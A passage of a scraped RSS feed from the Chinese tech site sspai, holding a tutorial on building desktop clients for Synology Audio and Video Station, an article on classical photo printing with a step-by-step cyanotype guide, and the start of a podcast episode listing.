href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/391495508?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"一日一技｜为群晖套件创建桌面独立客户端","date":"2021-07-20 09:30:00","description":"\n<p>通过群晖中的 Video Station 以及 Audio Station 两款套件，无论是在桌面设备还是移动设备都可以非常方便的播放自己收藏的音乐或者电影，不过相比移动端都有对应的客户端应用（DS audio和 DS video），桌面端则没有对应的独立客户端（除了 Windows 10 上有一个基于 UWP 的 video Station 客户端），每一次想要在桌面上使用以上两款套件时还需要先登录到 DiskStation Manager 然后再打开相关的套件，使用起来可以说是非常的不方便，那么有没有办法「自制」这些群晖套件的客户端呢？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/dc0ca7b9b3a977a85db30cfd7f5f1ff1.png\"></figure><p>实际上通过下面的一系列设置，我们完全可以实现「自制」群晖套件的桌面客户端，并且可以实现在任何网络环境下都可以正常访问使用。</p>\n<h2><strong>第一步：设置你的群晖QuickConnect</strong></h2>\n<p>首先第一步我们需要开启群晖的 QuickConnect，因为我们这一次需要自制的套件客户端都是基于群晖官方的应用，所以使用 QuickConnect 就可以实现在任何地方的远程访问群晖内的官方应用套件，开启之后我们就可以获得当前群晖对应的 QuickConnect 访问的地址。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/29e6e7592c7446a02cf9982cf6214a7f.png\"></figure><p>这里需要注意的是，虽然控制面板中给出的地址是：</p>\n<p><code>http://QuickConnect.cn/&lt;你的QuickConnect ID&gt;</code></p>\n<p>但实际上你也可以使用这个 QuickConnect 的二级域名来访问：</p>\n<p><code>http://&lt;你的QuickConnect ID&gt;.quickconnect.cn/</code></p>\n<p>而这个二级域名也是后面创建独立客户端的基础。</p>\n<h2><strong>第二步：为应用程序套件开启「登录门户」</strong></h2>\n<p>接下来我们需要设置「登录门户」，从而让前面我们提到的套件可以不用打开 DSM 就可以直接访问，这也是我们将其制作成桌面独立 App 最为重要的一步。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/aca117ce817fa814b06af34222352d69.png\"></figure><p>这里依旧是在群晖的「控制面板」，找到「登录门户」切换到「应用程序」选项卡，这里选择需要设立独立登录入口的应用，比如说「Audio Station」，选中后点击「编辑」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/fc2b572e4575a6eba849c5ef374a3f85.png\"></figure><p>在编辑设置中只要需要我们调整的是「网页服务」，这里有「别名」、「自定义端口」可以进行编辑，而这里我们只需要设置对应的别名并保存即可，例如我的 Audio Station 的网页服务别名就是「audio」，对应的下面会出现登录的 Audio Station 独立入口，其实就是当前登录 DSM 的地址之后的加了一个目录地址：</p>\n<p><code>http://&lt;你的DSM地址&gt;/audio</code></p>\n<p>以此类推我们可以使用相同的办法来设置 Video Station 套件的登录门户，比如我设置的 Video Station 登录门户就是：</p>\n<p><code>http://&lt;你的DSM地址&gt;/video</code></p>\n<p>其实到这里你应该就能和前面我们设置的 QuickConnect 访问关联起来了——没错，经过前面的设置，现在无论是出于同一局域网还是外网都可以使用：</p>\n<p><code>http://&lt;你的QuickConnect ID&gt;.quickconnect.cn/&lt;登录门户别名&gt;</code></p>\n<p>来访问直接访问你的 群晖中的应用套件，比如我的 Audio Station 的直接访问地址就是：</p>\n<p><code>http://&lt;我的QuickConnect ID&gt;.quickconnect.cn/audio</code></p>\n<p>将上面的地址通过浏览器访问，是不是已经可以直接访问这些群晖内的应用套件了？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/80c59a508db5bbbec6d1505311a98bc9.png\"></figure><h2><strong>第三步：使用 Chrome 浏览器将网址转变成 web App</strong></h2>\n<p>如果你恰好使用 Chrome 来访问上面我们生成的独立登录门户网址，你一定会这么想：如果直接创建当前网页的快捷方式，不就是间接的创建了这些套件的独立桌面应用了么？但实际操作后也不难发现其中的问题——由于这些 QuickConnect 地址会根据最终路由以及解析情况动态的进行变化，最终生成的网址在你其他的设备上就不一定可以实正常访问，因此最好的办法就是将原始的门户网址直接生成 Chrome Web App，但这就需要一些小技巧来实现。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/85d5e176be273487151ec1632e44f878.png\"></figure><p>首先在 Chrome 新标签页中开启「我的快捷方式」，之后在当前新标签页中点击「添加快捷方式」来创建一个快捷方式，比如我希望创建一个 Audio Station 的 Chrome web App，这里「名称」我就填：Synology Audio Station，「网址」就是我们前面设置的门户访问地址并保存：</p>\n<p><code>http://&lt;我的 QuickConnect ID&gt;.quickconnect.cn/audio</code></p>\n<p>然后我们先将这个生成的快捷方式使用鼠标先拖到「书签栏」转变成书签，同时访问<code>chrome://apps/</code> 打开 Chrome 应用管理页面，把刚才保存为书签的应用门户地址「拖放到」应用中，这样原始的应用门户地址就转变成了 Chrome Web App，右键勾选上「在窗口打开」并点击生成的快捷方式——这个「自制」的群晖应用套件桌面客户端初具雏形。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/29a29454d048669291e317aaf4e9cc08.png\"></figure><h2><strong>第四步：美化通过 Chrome Web App 生成的群晖套件独立 App</strong></h2>\n<p>虽然生成的「群晖套件的桌面客户端」已经完全可以正常使用了，但无论是名字还有应用图标都不够美观，所以针对不同的平台我们需要动一下小手术，让他看上去更为和谐统一。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/6d519a49675ddac61569994ed5af7cc4.png\"></figure><p>Mac 上创建的 Chrome Web App 会自动在 「Chrome 应用」中生成对应的 App，在「访达」中找到生成的 App 然后右键选择「显示简介」，在「名称与扩展名」中将名称改为「Synology Audio station.app」，这样在「启动台」中就可以看到正常的应用名了。另外自动生成的 App 图标也非常的模糊，这里我们采用替换大法——<a href=\"https://cdn.pano360.cn/synology/AudioStation.icns\">下载我已经转换好的图标文件</a>，然后将其拖拽到「显示简介」左上方的图标处替换即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/a830bbf4c271dc276a24521a9bec1f70.png\"></figure><p>而在 Windows 上，生成 Chrome 应用则可以添加成桌面快捷方式，找到桌面生成的快捷方式，首先在「常规」选项卡中修改应用名称为「Synology Audio Station」，然后切换到「快捷方式」选项卡中选择「更改图标」，然后点击「浏览」找到已经转换好的 ico 文件，最后点击「确定」使之生效，这样无论是 Mac 端还是 Windows 端，生成的群晖套件桌面客户端都已经基本算是完成了，打开应用也无需先登录 DSM 桌面，但就体验上和哪些流媒体音乐的桌面客户端也基本无异。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/e2602bf535ac4805a9b008d3d448b1a1.png\"></figure><h2><strong>第五步：通过工具生成真正的独立桌面 App</strong></h2>\n<p>上面的方法说实话有些「讨巧」——利用 Chrome App 省却了繁琐的 App 生成操作，实际上如果不依赖 Chrome 生成独立桌面 App 也并非不可行，比如说可以使用 nativefier 这样的非 GUI 工具来实现（<a href=\"https://sspai.com/post/43257\">延伸阅读：常用的网络服务没有电脑客户端？你可以自己动手做一个丨一日一技</a>），这里我就不再一一阐述演示了。</p>\n<p>考虑到 Windows 10 上可以使用 UWP 版本的 DS Video 客户端，因此我还是在 Mac上使用了一款 GUI 工具来生成一个单独的 Video Station 桌面客户端（不需要通过 Chrome 进行同步），这里我选择的是 Setapp 应用商店中的 Unite 来进行操作：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/6dbebdcd57781a6ba8dfa1c3c940df26.png\"></figure><p>在生成 App 的编辑页面输入 Video Station 对应的原始门户网址以及名称，然后选择找到的 Video Station 的 Logo。如果需要进一步设置，可以在左下角的图片选项中勾选logo 的样式（我选择的是和当前我的 Big Sur 的圆角类似），最后点击「Create Unite Application」来生成 App，这样的生成的 App 效果更接近原生开发的 App，自然体验也更好一些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/7dc30b4f4f7d59971de0bbb30bb03933.png\"></figure><h2><strong>结语</strong></h2>\n<p>通过以上的一系列操作，我终于实现了为群晖的两大影音套件创建适用于 Windows 以及 Mac 的独立客户端，当然除了影音套件之外，其他的套件也可以使用类似的方法来自制，如果你也有类似的需求不妨试试看。</p>\n<p><strong>关联阅读：</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/64374\" target=\"_blank\">新一代 NAS 操作系统：群晖 DSM 7.0 深度体验</a></li>\n<li><a href=\"https://sspai.com/post/60610\" target=\"_blank\">如何让群辉 NAS 的 Video Station 正确获取元数据、支持 DTS 音轨</a></li>\n<li><a href=\"https://sspai.com/post/66142\">一日一技 | 让新版群晖 Video Station 正常播放带专利音轨</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现🚀</p>\n","link":"https://sspai.com/post/67769"},{"title":"即便快门很快，我也还是想教你如何慢慢冲洗一张照片","date":"2021-07-20 08:00:09","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2>前言</h2>\n<p>去年在少数派发布了一篇「<a href=\"https://sspai.com/post/59198\" target=\"_blank\">亲手冲洗胶卷，是我在数码时代对情怀的续杯</a>」的文章，当时有人评论我说「以为会冲洗纸质照片出来呢 」，和我妈妈看到我洗胶卷的想法一样哈哈。不过在胶片<sup class=\"ss-footnote\" href=\"https://baike.baidu.com/item/%E8%83%B6%E7%89%87/6266304\" title=\"银盐感光胶片，也叫菲林，一般是指胶卷，也可以指印刷制版中的底片\" footnote-id=\"1\">1</sup>摄影里，胶片的冲洗更多时候指的是「将相纸中的金属银还原出来，使胶片从潜影到显影」的过程，冲洗出纸质相片则被称之为「印相<sup class=\"ss-footnote\" href=\"https://m.thepaper.cn/newsDetail_forward_7002477#:~:text=%E5%8D%B0%E7%9B%B8%E5%B7%A5%E8%89%BA%EF%BC%8C%E9%A1%BE%E5%90%8D%E6%80%9D,%E5%BD%B1%E5%83%8F%E5%8D%B0%E5%88%B6%E6%88%90%E7%85%A7%E7%89%87%E3%80%82\" title=\"印相，指通过化学物质光敏感特性将拍摄得到的底片影像印制成照片\" footnote-id=\"2\">2</sup>」，也就是我在本文中会介绍的一种古典工艺。没错，这次我要冲洗出纸质照片啦。</p>\n<p>由于印相和拍照是两个相互独立的过程，无论是胶片摄影还是数码摄影，无论是用相机拍的还是手机拍的，都可以通过印相工艺将它呈现在相纸上，形成一幅可供观赏和收藏的实体作品。如果平时就有尝试胶片摄影，那可以直接将拍好的底片用来印相，如果没有，也可以将数码照片转为可供印相的底片后进行实践。在本文中，我会介绍几种常见的印相方式，同时选取了其中最为简单的一种「蓝晒法」展开讲讲具体是怎么来做的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/article/b92662df40528fe030d694a0b2c416ef\"><figcaption>用蓝晒法冲洗好的相片（用kodak vision3 250d电影卷拍摄 略有偏色）</figcaption></figure><h2>印相的由来：第一幅永久保留的感光图像</h2>\n<blockquote><p>对于摄影者，技术很重要，但技术发展的后果是，总会有一种时尚取代另一种时尚，让人不停地追赶，这容易使人们停止思考照片的真正意味，渐渐缺乏对图像的目的、功能、解释的思考力和想象能力。——钟少丰 《画幅无边》前言</p></blockquote>\n<p>在摄影历史里，我们是经历了巨大变革的一代。回看我小时候的照片，都还是用胶片一卷卷拍出来的；而我今年出生的侄女，从出生的第一张照片开始就是数码的产物。从胶片到数码的跨越，不同于以往每一次感光材质的变革，这是一次对传统摄影技艺的颠覆。</p>\n<p>我享受着数码摄影为生活带来的便利，但时常也会怀疑摄影的乐趣。被「拍十张总有一张是好的」理念带偏，在追求量的过程中，逐渐感受到麻木和厌倦，这时才回头思考摄影于我的意义，恰好是在这时候，我接触到了胶片和印相工艺，这让我找回了对摄影的热爱，也让我有了更深的思考。</p>\n<p>在摄影术诞生之前，照相机还只是一个可以「照」而不能「留相」的暗室。所谓暗室，是在一个全黑的屋子墙上凿出一个小孔并装上凸透镜，让室外的影像得以呈现在室内的墙壁上；主要设置在公共场所供游客观赏。暗室出现之后，人们一直在寻找可以将影像留存的方法，直到 300 百年后，法国人尼埃普斯<sup class=\"ss-footnote\" href=\"\" title=\"尼埃普斯（ Joseph Nicéphore Nièpce）,1765年3月7日生于法国索恩-卢瓦尔省索恩河畔沙隆，法国发明家，世界上第一幅永久性照片《窗外》的拍摄者\" footnote-id=\"3\">3</sup>才找到有效固定影像的方法。</p>\n<p>1826 年，尼埃普斯通过白色沥青的光硬化方式，选择了装有透镜的暗箱尝试名为「日光摄影法」的实验。他在暗箱里放置一块涂有油溶白沥青的铅锡合金板，进行了整整 8 小时的曝光，得到了世界上第一幅永久保存下来的经感光而成的图像《鸽子棚》。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/article/db169ff2dcf67c630af6c269f3c3ce8e\"></figure><p>在尼埃普斯之后，仍不断有人尝试用不同的材料来固定影像，其中法国人达盖尔<sup class=\"ss-footnote\" href=\"https://zh.wikipedia.org/wiki/%E8%B7%AF%E6%98%93%C2%B7%E8%BE%BE%E7%9B%96%E5%B0%94\" title=\"路易·雅克·曼德·达盖尔（法语：Louis-Jacques-Mandé Daguerre，1787年－1851年），是一名法国发明家、艺术家和化学家。原为舞台背景画家，后发明达盖尔银版法，又称达盖尔摄影法\" footnote-id=\"4\">4</sup>发明的「银版摄影法」被公认为是摄影术的诞生且影响至今。达盖尔采用磨光并经碘蒸汽处理后的涂银铜版作为感光材料，经照相机曝光后，先用汞蒸汽处理，再用食盐溶液定影，以获得可以永久保存的正像，这也是我们目前较为常见的古典印相工艺。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/18/article/1693e2f77323f25886f7ce1d215c4e64\"></figure><h2>古典印相技艺</h2>\n<h3>蓝晒印相工艺</h3>\n<p>1842 年前后，约翰·赫谢尔爵士发明了蓝晒印相工艺<sup class=\"ss-footnote\" href=\"https://en.wikipedia.org/wiki/Cyanotype\" title=\"蓝晒法（Cyanotype）是一种产生青蓝色照片的照相印刷工艺。 工程师在 20 世纪很好地使用该过程作为一种简单且低成本的过程来制作图纸副本，称为蓝图\" footnote-id=\"5\">5</sup>（也叫铁氰酸盐/铁-普鲁士蓝印相法），用柠檬酸铁铵溶液和铁氰化钾溶液进行感光，是摄影术出现后第一种实用的非银盐摄影工艺。由于化学成分和处理方法非常简单，蓝晒印相工艺常被称为最简单的手工印相工艺，因此受到古典工艺初学者的普遍欢迎。在本文介绍的几种工艺中，蓝晒算是成本最低、安全度最高且最简单的工艺，因此在后文里我会详细讲讲「如何制作一张蓝晒印相」，在这里我们先整体了解有哪些印相工艺啦。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/article/38ce89924e0f366de4b8c28a67bffdb0\"><figcaption>用蓝晒法冲洗好的相片</figcaption></figure><h3><strong>铂钯印相工艺</strong></h3>\n<p>1873 年，威廉·韦利斯发明了铂金<sup class=\"ss-footnote\" href=\"https://baike.baidu.com/item/%E9%93%82%E9%87%91\" title=\"铂金（Platinum，简称Pt），是一种天然形成的白色贵重金属。在人类使用铂金的2000多年历史中，它一直被认为是最高贵的金属之一\" footnote-id=\"6\">6</sup>印相工艺，以铂系金属为主要感光材料，用接触印相的方法在日光下晒制照片。由于铂金化学性质十分稳定，由铂金印相工艺制作的作品可以保存得更为持久，一般可以保存 500—1000 年不褪色，非常适合用于制作收藏级作品，因此被称为「纸质不坏，影像长存」。但由于铂金作为贵金属，制作的成本较高，也一直被视为摄影工艺的「贵族」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/article/a215ae146e28c5a39bc214f75b3e3f54\"><figcaption>在老师暗房里冲洗的铂钯印相</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/article/47e85d408b75b850d6fed9195254324c\"><figcaption>价格四位数的药水（图来自朋友@sam）</figcaption></figure><h3><strong>蛋白法银盐工艺</strong></h3>\n<p>1847 年，路易斯·布兰夸特·埃佛拉德发明了蛋白法银盐工艺，用蛋清作为纸基和感光成分的接触层。作为摄影史上最成功的印相介质之一，蛋白法银盐工艺在当时较好满足了庞大的印相需求。在文章《蛋白印相法成为焦点》中，作者麦克·罗宾逊指出，在 19 世纪 80 年代，德国德累斯顿的一家公司每年使用超过 600 万个鸡蛋来制作蛋白法纸张的涂层。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/article/bbb94c909a7122e636347ff8a6539676\"><figcaption>使用蛋白法银盐工艺冲洗的照片（图片来源网络）</figcaption></figure><h3><strong>碳素印相工艺</strong></h3>\n<p>1855 年，路易斯·普瓦提埃发明了碳素明胶印相工艺，用重铬酸盐和胶体混合进行感光。在制作时，用涂有混合碳黑的重铬酸盐明胶的纸张和底片接触，再水洗留下影像（光照部分硬化不溶于水）。除了碳黑之外也可以混合其他颜色的颜料，而标准的碳素相纸一般呈现出巧克力棕色。这项工艺不仅可以用于碳转移的制作，还对后来产生的溴化银印相工艺和树胶重铭酸盐工艺等起到一定的引导作用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/article/67fdce25f3ae7a13045b635cfa9989a7\"><figcaption>李国荣老师用碳素印相工艺制作的《四大天王》</figcaption></figure><h3><strong>湿版火棉胶工艺</strong></h3>\n<p>1851 年，弗雷德里克·斯科特·阿切尔发明了湿版火棉胶工艺，此工艺以透明玻璃板为片基，将硝化棉溶于乙醚和酒精的火棉胶，再将碘化钾溶于火棉胶后即刻涂布在干净的片基上并装入照相机曝光，以得到一张玻璃底片。湿版火棉胶工艺因其成本低廉，仅为银版法的十二分之一，在诞生之后取代达盖尔银版法流行了三十年。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/article/a05c50e23385f24946ea7461362717d8\"><figcaption>使用湿版火棉胶工艺冲洗的照片（图片来源网络）</figcaption></figure><h2>在家洗照片：从一张蓝晒开始</h2>\n<p>在前文我们已经了解了何为蓝晒，现在就来看看如何制作一张蓝晒吧。</p>\n<h3>所需材料</h3>\n<ul>\n<li>底片：可以直接用拍好的胶片或者是打印转好底的数码照片（在某宝搜索底片打印）</li>\n<li>药剂：柠檬酸铁铵<sup class=\"ss-footnote\" href=\"\" title=\"柠檬酸铁铵，是一种有机化合物，为棕色或绿色的鳞片或粉末，无臭。用于照相业、制药工业，还可作为食品铁强化剂\" footnote-id=\"7\">7</sup>溶液、铁氰化钾<sup class=\"ss-footnote\" href=\"\" title=\"铁氰化钾，是一种无机物，俗称赤血盐、赤血盐钾，为红色晶体，可溶于水，水溶液带有黄绿色荧光\" footnote-id=\"8\">8</sup>溶液</li>\n<li>用于印相的材料：相纸/水彩纸/衣服/布袋.....</li>\n<li>一把刷子（不含金属材料为佳）</li>\n<li>用于固定底片和相纸的材料（可以是相框或玻璃等）</li>\n<li>铅笔+尺子（用于标记涂布范围）</li>\n</ul>\n<h3>step1 药液：直接购买或自行调配</h3>\n<blockquote><p>注：本节所介绍的为传统蓝晒配方，另有新蓝晒配方但成本较高且毒性大，不在本文中提及，感兴趣的可以到毒镜头的<a href=\"https://www.dujingtou.com/article_17914.shtml\" target=\"_blank\">这篇文章</a>了解</p></blockquote>\n<p>蓝晒法需要的药剂主要是柠檬酸铁铵和铁氰化钾，在购物网站搜索「蓝晒药剂」即可查到。如果只是想体验一下，建议直接购买调配好的「蓝晒体验装」，一般是 20-100ml 左右，价格在  40-90 元左右。如果是有大量制作蓝晒印相的需求，也可以直接购买原液自己调配，调配的过程十分简单，药剂价格也相对便宜，80 元以内即可买到两瓶 500g 的药剂用于配制。</p>\n<p>值得注意的是，调配好的药剂会随着存放时间的增加而降低感光性，从而影响成像的效果。如果是自己调配药液的话，一次调配 100ml 以内的药液基本就够用了，调配太多容易造成不必要的浪费。由于有两种药剂，在实践中我们通常会用 A/B 液进行划分：</p>\n<ul>\n<li>A 液：100 克柠檬酸铁铵 +400 毫升水；溶解后用水稀释至 500 毫升备用。</li>\n<li>B 液：40 克铁氰化钾 400 毫升水；溶解后用水稀释至 500 毫升备用。</li>\n</ul>\n<p>按照比例将药液与水混合，放到褐色避光试剂瓶中并及时做好标记，最好放置 24 小时之后再使用。虽然我在使用时也试过配好马上就使用，也顺利做出了蓝晒印相，但还是建议放置 24 小时再使用，这样可以增加药剂的稳定性，保证成像的效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/article/937393a61f2b18aaf533f7d81803f8cb\"><figcaption>调配蓝晒药水</figcaption></figure><h3>step2 标记：明确涂布范围</h3>\n<p><strong>注意：用铅笔，标记时尽可能轻。</strong></p>\n<p>我们最终冲印出的成像大小取决于我们的底片大小，因此在开始涂布前，一般建议先用铅笔标记好涂布的区域，避免涂少了成像缺失、或是涂多了导致边缘过多影响美观。在标记时，可以先量好底片的大小，然后在相纸上画出相应大小的区域。或者是直接将底片放在相纸上面比划尺寸，用铅笔在底片四个角的位置下方即相纸上画个小点，再用尺子和铅笔画矩形标记出范围。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/article/c79d7f0c876d7f0041c59dabbe22de87\"><figcaption>用铅笔在四周做标记</figcaption></figure><h3>step3 涂布：用刷子将药剂涂到相纸上</h3>\n<p>如果是和我一样想用来制作相片的话，可以提前买好不含荧光剂的水彩纸用于印相，如果手头没有合适的材料又或者是想要做一些有创意的装饰的话，也可以用棉质衣服、布袋、书本封面等等用来印染。准备好涂布材料之后，将事先调配好的A/B液按照自己所需要的量 1:1 混合，一般 4 毫升的量即可涂满一张A4纸大小的区域。</p>\n<p>涂布的时候，用刷子快速均匀地刷上药液，尽可能让药剂均匀地刷在相纸上。在涂布时应避免用刷子反复刷同一个部位，而是用「推」的方式刷一次即可。似乎看起来有些玄乎，但涂布的效果会直接影响最后成像的效果，所以还是需要多加练习啦，我曾和朋友一整天都呆在暗房里实验就为了涂出一张均匀的成像😂。</p>\n<p>涂布好的相纸需要等到干透了才可以进行曝光，我一般直接用吹风机的低温档均匀吹相纸。如果时间充裕也可以直接将相纸放在干燥阴凉的地方晾干。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/article/541dc32af68ddfa7886d9331d1bca076\"><figcaption>涂布过程</figcaption></figure><h3>step4 曝光：将涂布好的相纸和底片放在一起曝光</h3>\n<p>注意：将涂布好的相纸「药剂面」和底片接触，相纸放在下面，底片正面朝上放在上面。</p>\n<p>由于我是在实验室进行操作，直接在紫外线曝光箱中完成了曝光的过程。如果是在家自己操作，可以用自然日光曝光。将相纸夹在两张玻璃板中间并固定好，放在太阳光下晒。不同的天气情况，蓝晒曝光所需要的时间不一样。在阳光明媚的晴天，曝光时间在 15-25 分钟左右即可，冬季的阴天则通常需要 45 分钟以上。对于天气时间把控不准的，建议在日晒时每隔 15 分钟左右观察一次，待成像完全呈现出来（覆盖的敏化剂区域会先变暗为蓝色，然后又变回为浅蓝灰色，而日晒完成后的相片高值应为绿色）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/article/084267930c083661f042605021d3b812\"><figcaption>放置顺序：相纸在下，底片在上（蓝晒没拍到 用了一张铂钯印相拍的）</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/article/66fd4ab7ec212323c6ec5b6eddb4de28\"><figcaption>曝光好的蓝晒，高光部分偏绿色</figcaption></figure><h3>step5 显影：我最喜欢的一步</h3>\n<p>蓝晒由于工艺简单，可以直接用清水进行显影。将曝光好的蓝晒放在干燥的容器之中，将清水匀速、均匀地倒在相纸上。在这一个步骤里，可以清晰地看到蓝色地方显现出来，高光的地方变成白色，具体可以参见下面这张动图。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/801a17293704d8a83bd8bfc294e0c984.GIF\"><figcaption>虽然但是 这张我还更喜欢显影之前的</figcaption></figure><p>这一步结束，我们基本就可以看到自己洗出来的效果啦，由于水冲出相的一刻短暂又变化无穷，因为无法预测而又充满期待，所以是整个过程我最享受的一步。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/article/5b62ef94ab7f0be7f02a99a1a79b341d\"><figcaption>太喜欢这个过程啦 放多一张铂钯印相的</figcaption></figure><h3>step6 水洗：冲掉残留的药剂</h3>\n<p>显影之后，把相纸连着容器放在水龙头下面，拧开水龙头冲洗十分钟左右，保证残留的药剂被洗干净。之后将相纸晾干就完成啦～</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/article/2c1749f7b880ebf152f576108f964f07\"><figcaption>水洗</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/18/article/37ad2d6b4be045607106d7459d8edd20\"><figcaption>做好签个名</figcaption></figure><h2>结语</h2>\n<p>谈起胶片摄影和印相工艺，人们常会把它与「过时的旧玩意」联系在一起，胶片摄影有 200余年的发展历史，其鼎盛时期距今也才过去 20 个年头，但新生一代对胶片的认识大多都停留在仿胶卷 app 上，对不同印相工艺的认识也只限于特殊的滤镜效果（甚至并不知道部分特殊滤镜对应的是印相工艺）。</p>\n<p>数码摄影为我们提供了更为高效便利的摄制选择，也真正让摄影这门艺术大众化，但也产生了新的问题。正如南京艺术学院教授钟建明所说的「摄影在今天存在两个突出的问题，一是太容易获得，作为艺术的语言缺少思考；二是当今的影像拍摄产生的大部分成果仍保留在电脑屏幕上」。诚然，在数码摄影流行之后，家里的纸质相册越来越少，少有的几本也只是数码打印机打印的成像。</p>\n<p>在人人都拥有一部手机，拥有手机即可以摄影的当下，相信每个人或多或少的都会有一些自己珍藏的照片。除了将心爱的照片打印出来，或许亲手把它做出来也不失为一种更为独特的体验。毕竟手工印相工艺强调的过程性、实验性、不可预料性，为每一张相片都注入了新的元素，而作为实践者我们在冲印过程中付出的时间和精力，也会让这张相片显得更为珍稀。当然，在实践时务必小心，初体验尽量选择安全简单的工艺进行。</p>\n","link":"https://sspai.com/post/67767"},{"title":"一派·Podcast｜2021 年，什么样的数字科技产品更有趣？","date":"2021-07-20 06:20:09","description":"\n<p>本期节目是少数派与 <a href=\"https://www.lzpipi.com/\">荔枝播客</a> 联合制作的在线直播节目，我们在这个系列直播中畅谈了和数字生活有关的话题，在首期节目中，我们聚焦有趣的数字科技产品。</p>\n<p>如今，数码科技产品已经完全融入了人们的生活，每个人都已经习惯了购买各类数码产品，或用于娱乐，或用作工具。在这场直播中，我们想带你切换到幕后视角，结合电商选品与运营的角度，谈谈哪些数码科技产品更有趣，顺便分享近期令我们印象深刻的、有趣的产品。</p>\n<h2>✅️ 订阅节目</h2>\n<p>我们推荐你使用 RSS 链接来订阅节目，以获得最佳收听体验。如果你不了解 RSS 订阅节目的方法，请参考 <a href=\"https://sspai.com/post/57960\">这篇文章</a> 中的指导。</p>\n<ul>\n<li>RSS 地址：<a href=\"https://sspai.com/s/JQNP\">https://sspai.com/s/JQNP</a>\n</li>\n<li>Pocket Casts：<a href=\"https://sspai.com/s/ngbM\">https://sspai.com/s/ngbM</a>\n</li>\n<li>Overcast：<a href=\"https://sspai.com/s/za8a\">https://sspai.com/s/za8a</a>\n</li>\n<li>Castro：<a href=\"https://sspai.com/s/JRyj\">https://sspai.com/s/JRyj</a>\n</li>\n<li>Spotify：<a href=\"https://sspai.com/s/KNgq\">https://sspai.com/s/KNgq</a>\n</li>\n<li>小宇宙：<a href=\"https://sspai.com/s/KWP0\">https://sspai.com/s/KWP0</a>\n</li>\n</ul>\n<p>如果你觉得网络访问不畅，可以尝试使用下面的 RSS 链接订阅节目。该链接没有章节和节目内页，但或许可以在主订阅无法顺利收听时帮到你。</p>\n<ul><li>RSS 地址：<a href=\"http://www.ximalaya.com/album/31769739.xml\">http://www.ximalaya.com/album/31769739.xml</a>\n</li></ul>\n<p>我们的节目已经在 Himalaya 平台上线，海外听众可以点击以下链接直达：</p>\n<ul><li>Himalaya： <a href=\"https://www.himalaya.com/sspai\">https://www.himalaya.com/sspai</a>\n</li></ul>\n<h2>🎧 直接收听</h2>\n<div class=\"ss-audioSource\" src=\"https://r.typlog.com/eyJzIjoxODkzLCJlIjo4NjAwLCJwIjoyLCJ1IjoiMTMxMi5tcDMifQ.6duCPy-9hX2UkhC4Wh8JJ7X2QCM/sspai/8373315149_81312.mp3\" title=\"2021 年，什么样的数字科技产品更有趣？\" cover=\"https://cdn.sspai.com/2021/07/19/3209a6133411dc6869a43f7a726bb52a.jpg\" artist=\"少数派\" 